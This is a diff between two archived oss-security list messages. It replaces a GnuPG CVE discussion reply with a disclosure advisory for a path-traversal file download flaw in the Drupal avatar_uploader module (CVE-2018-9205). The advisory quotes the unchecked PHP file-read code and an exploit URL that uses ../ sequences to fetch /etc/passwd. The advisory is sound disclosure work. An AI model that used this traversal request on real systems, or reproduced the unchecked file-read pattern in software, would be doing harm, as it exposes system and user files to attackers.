@@ -1,46 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/06/13/3
-Message-ID: <olv_Epzwz4jvQCGNLIBY5Ij1Xizr1uG9HSj2IbgCrP8mqjkxs2s_jD9rz1L_gubdClRr71MOFF6pYj_i-NWiYgwSrlvZLV9cu6CHaBNSm0w=@itk.swiss>
-Date: Tue, 12 Jun 2018 16:56:13 -0400
-From: Stiepan <stie@....swiss>
-To: corsac@...ian.org, oss-security@...ts.openwall.com, marcus.brinkmann@...r-uni-bochum.de
-Subject: Re : Re: Re : Re: CVE-2018-12020 in GnuPG
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/12/1
+Message-id: <3B4F690F-2918-4282-BEBE-E163F07D205F@me.com>
+Date: Thu, 12 Apr 2018 08:28:15 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8
 Content-Type: text/plain; charset=utf-8
 
-Hi Yves-Alexis,
+Title: Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8
+Author: Larry W. Cashdollar
+Date: 2018-03-30
+CVE-ID:[CVE-2018-9205]
+Download Site: https://www.drupal.org/project/avatar_uploader
+Vendor: https://www.drupal.org/u/robbinzhao
+Vendor Notified: 2018-04-02
+Vendor Contact: https://www.drupal.org/project/avatar_uploader/issues/2957966#comment-12554146
+Advisory: http://www.vapidlabs.com/advisory.php?v=202
+Description: This module used Simple Ajax Uploader, and provide a basic uploader panel, for more effect, you can do your custom javascript. Such as, users' mouse hover on avatar, the edit link will slideup, or others.
+Vulnerability:
+The view.php contains code to retrieve files but no code to verify a user should be able to view files or keep them from changing the path to outside of the uploadDir directory:
 
-Any updates on this?
+<?php
 
-By the way, it might be the occasion to switch to more future-proof signatures, such as
-https://datatracker.ietf.org/doc/rfc8391 , which are reputed as quantum-safe and do not depend on some hardness assumptions.
-We could help with an open-source implem. if needed.
-Apparently, NIST is also moving into that direction for software signatures, according to information given now at ETSI's security week.
+$file = $_GET['file'];
 
-Best regards,
-Stiepan A. Kovac
-President
-itk AVtobvS SARL
+echo file_get_contents("uploadDir/$file");
+exit;
 
-Envoyé depuis ProtonMail mobile
-
--------- Message d'origine --------
-On 10 juin 2018 à 18:38, Yves-Alexis Perez a écrit :
-
-> On Sun, 2018-06-10 at 10:58 -0400, Stiepan wrote:
->
-> Hi Stepian,
->
->> This responsibility discussion is all well and fine, but now that this is
->> half-public, may we know for sure whether we are affected :
->> 1. as debian(-like) package consumers
->
-> Not entirely sure what you mean here, but if you're talking about the apt
-> package managers (which relies on gpgv for signature verification), it's
-> currently investigated.
->
-> Note that all supported suites have had their gnupg version updated: https://s
-> ecurity-tracker.debian.org/tracker/CVE-2018-12020
->
-> Regards,
-> --
-> Yves-Alexis
+Exploit Code:
+	• http://example.com/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
